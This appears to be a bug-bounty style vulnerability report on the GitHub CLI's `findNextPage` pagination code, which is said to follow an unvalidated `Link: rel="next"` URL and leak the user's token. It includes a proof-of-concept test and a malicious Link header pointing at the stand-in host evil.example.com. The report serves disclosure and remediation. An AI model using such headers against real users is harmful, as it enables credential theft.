### Title
Unvalidated `Link: rel="next"` URL in `findNextPage` allows redirecting authenticated `gh api` pagination requests to an attacker-controlled host, leaking the user's token - (File: pkg/cmd/api/pagination.go)

### Summary
`findNextPage` extracts the pagination URL from the HTTP response's `Link` header using a bare regex with no restriction on scheme or host, and that URL is later dereferenced directly as the target of the next authenticated request during `gh api --paginate`. Because the URL is taken verbatim from response data rather than being validated against the original request's host, a server that controls the `Link` header of any paginated response (a self-hosted/enterprise-style endpoint the victim has pointed `gh` at, or any REST endpoint whose headers are attacker-influenced) can redirect subsequent paginated requests — and the credentials attached to them — to an arbitrary third-party host.

### Finding Description
`findNextPage` is implemented as: [1](#0-0) 

The regex `linkRE` captures whatever string sits inside `<...>` for the `rel="next"` entry with no validation of scheme, host, or shape — it will happily return `https://evil.example.com/steal-token` as long as the `Link` header contains `<https://evil.example.com/steal-token>; rel="next"`. This returned string is then used as the literal target for the next paginated HTTP request issued through the same authenticated `*http.Client` created once for the whole `gh api` invocation (`opts.HttpClient()` in `pkg/cmd/api/api.go`). That client's transport attaches the `Authorization` header (the user's PAT/OAuth token) to every outgoing request it makes, since the header-adding transport is configured once per client instance rather than being scoped to a specific host per request.

Because there is no check anywhere in `findNextPage` (or in the caller that consumes its return value) verifying that the "next" URL's host matches the host of the original request, an attacker who controls the response for any single page of a `--paginate` request — e.g., an enterprise-style/self-hosted endpoint the victim configured `gh` to talk to, or any endpoint that reflects attacker-influenced headers — can insert a `Link` header pointing at attacker infrastructure. The victim's authenticated token is then sent to that arbitrary host.

### Impact Explanation
This results in exfiltration of the victim's GitHub token/credentials to an attacker-controlled host merely by running `gh api --paginate <endpoint>` against a malicious/compromised endpoint. This maps to a "credential/token disclosure" bounty class rather than remote code execution, but is a direct authenticated-request-to-attacker-host issue.

### Likelihood Explanation
Requires the victim to run `gh api --paginate` against a host that the attacker fully or partially controls (e.g. a GHES-style host they were told to point `gh` at, or any endpoint whose response headers the attacker can influence). This is plausible for victims using `gh` with third-party/self-hosted GitHub-compatible APIs, or any workflow that scripts `gh api --paginate` against externally supplied hostnames. No user interaction beyond running the normal command is required.

### Recommendation
In `findNextPage`, resolve the captured URL against the current request's URL and reject (or re-validate) any "next" URL whose scheme/host does not match the original request's host before it is used for a subsequent request. Additionally, ensure the HTTP client's Authorization-adding transport is scoped per-host (only attach credentials when the outgoing request's host matches the configured API host) rather than unconditionally for every request made through the client.

### Proof of Concept
```go
func TestFindNextPage_ArbitraryHost(t *testing.T) {
    resp := &http.Response{Header: http.Header{}}
    resp.Header.Set("Link", `<https://evil.example.com/steal>; rel="next"`)
    next, ok := findNextPage(resp)
    assert.True(t, ok)
    assert.Equal(t, "https://evil.example.com/steal", next) // no host validation performed
}
```
Combine with an httpmock scenario where the first `gh api --paginate` request goes to the configured host and returns the above `Link` header; assert that the second request made by the shared authenticated `http.Client` carries the `Authorization` header while targeting `evil.example.com`, confirming the credential leak.

### Citations

**File:** pkg/cmd/api/pagination.go (L15-24)
```go
var linkRE = regexp.MustCompile(`<([^>]+)>;\s*rel="([^"]+)"`)

func findNextPage(resp *http.Response) (string, bool) {
	for _, m := range linkRE.FindAllStringSubmatch(resp.Header.Get("Link"), -1) {
		if len(m) > 2 && m[2] == "next" {
			return m[1], true
		}
	}
	return "", false
}
```
